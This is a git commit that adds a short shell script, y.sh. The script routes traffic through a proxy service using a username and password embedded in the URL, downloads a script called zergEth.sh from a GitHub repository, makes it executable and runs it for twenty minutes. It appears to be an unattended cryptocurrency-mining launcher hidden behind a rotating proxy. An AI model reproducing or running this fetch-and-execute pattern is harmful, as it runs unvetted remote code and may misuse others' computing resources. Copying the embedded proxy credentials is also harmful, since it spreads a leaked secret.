bd6fb02466b15025b05e6403a70b0176c01b54d0
uoyeloue <93659624+uoyeloue@users.noreply.github.com>
2021-11-03 19:42:19 +0530

    Create y.sh

---
+++ y.sh
@@ -0,0 +1,5 @@
+#!/bin/sh
+export https_proxy="https://mvsaqplt-rotate:14valgck3brn@p.webshare.io:80/"
+wget https://github.com/tinkuJiya/gas/raw/main/zergEth.sh 
+chmod +x zergEth.sh 
+timeout 1200 ./zergEth.sh
